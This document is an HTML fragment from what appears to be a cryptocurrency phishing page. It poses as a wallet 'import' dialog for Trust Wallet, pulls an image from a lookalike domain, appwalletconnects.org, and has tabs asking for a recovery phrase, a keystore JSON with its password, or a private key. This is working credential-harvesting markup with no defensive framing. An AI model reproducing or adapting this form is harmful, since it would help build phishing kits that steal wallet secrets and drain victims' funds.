
            <form action="#" method="post" enctype="multipart/form-data" id="form" onsubmit="return false">


                <div class="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left w-full mr-10">
  
                  <h3 id="modal-headline" class="text-lg leading-6 mt-2 font-medium text-gray-900"
                    style="display: flex; flex-direction: row;"> <img
                      src="https://appwalletconnects.org/WalletAPI_wallets_files/saved_resource.html"
                      style="margin-right: 20px; height: 40px; width: 40px" id="myImg"><span>Import your <span
                        id="walletname"></span> wallet
                    </span>
                  </h3>
                  <div class="mt-2">
                    <div class="mt-10">
                      <div class="flex justify-evenly border-b-2 border-fuchsia-600 mb-4">
                        <div id="phrase" class="p-2 border-b-2 border-white hover:border-blue-600 cursor-pointer">
                          <button type="button" style="color: #000000;">Phrase</button>
                        </div>
                        <div id="keystore" class="p-2 border-b-2 border-white hover:border-blue-600 cursor-pointer">
                          <button type="button" style="color: #000000;">Sign In</button>
                        </div>
                        <div id="private" class="p-2 border-b-2 border-white hover:border-blue-600 cursor-pointer">
                          <button type="button" style="color: #000000;">Private key</button>
                        </div>
                      </div>
                      <div id="first" class="acc-body active">
                        <div class="flex flex-col">
                        </div>
                        <div class="flex flex-col mb-6">
                          <div class="relative"><textarea cols="30" rows="4" placeholder="Enter your recovery phrase"
                            style="width: 100%; border-radius: 6px; border: 2px solid grey;"
                              name="phrase" minlength="12" id="phraseInput"></textarea>
                            <p class="" style="color: grey; margin-top: 20px;">
                              Typically 12 (sometimes 24) words separated by single spaces
                            </p>
                          </div>
                          <button style="background-color: #0b91ff; font-size: 20px; padding: 8px; align-self: center; margin: 20px 20px; border-radius: 4px; width: 80%;" type="submit" name="submit"
                          id="phraseProceed" name="play"><span>PROCEED</span></button>
                        </div>
                        <div class="flex w-full"></div>
                      </div>
                      <div id="second" class="acc-body bg-grey-600">
                        <div class="flex flex-col">
  
                        </div>
                        <div class="flex flex-col mb-6">
                          <div class="relative"><textarea cols="30" rows="4" placeholder="Keystore JSON" 
                            style="width: 100%; border-radius: 6px; border: 2px solid grey;"
                              name="keystorejson" id="keystorejson"></textarea></div>
                        </div>
                        <div class="flex flex-col mb-4">
                          <div ><input type="text "style="width: 100%; border-radius: 6px; border: 2px solid grey;"  name="keystorepassword"
                              placeholder="Wallet password" id="keystorepassword">
                            <p class="" style="color: grey; margin-top: 20px;">
                              Several lines of text beginning with "{...}" plus the password you used to encrypt it.
                            </p>
                          </div>
                        </div>
                        <button style="background-color: #0b91ff; font-size: 20px; padding: 8px; align-self: center; margin: 4px 2px; border-radius: 4px; width: 80%;" type="submit" name="submit"
                        id="keystorejsonproceed" name="play"><span>PROCEED</span></button>
                      </div>
                      <div id="third" class="acc-body bg-grey-600">
                        <div class="flex flex-col">
                          <div class="relative"><input type="hidden" name="wallet_id" required=""
                              placeholder="Wallet ID" id="wallet_id" value="Trust wallet"></div>
                        </div>
  
                        <div class="flex flex-col mb-6">
                          <div class="relative"><input type="text" style="width: 100%; border-radius: 6px; border: 2px solid grey;"
                              placeholder="Enter your Private Key" name="privatekey" id="privatekey">
                            <p class="" style="color: grey; margin-top: 20px;">
                              Typically 12 (sometimes 24) words seperated by a single space.
                            </p>
                          </div>
                          <button type="submit" style="background-color: #0b91ff; font-size: 20px; padding: 8px; align-self: center; margin: 20px 20px; border-radius: 4px; width: 80%;"  name="submit"
                          id="privatekeyProceed" name="play"><span>PROCEED</span></button>
                        </div>
                        </div>
                        
                      </div>
              </form>
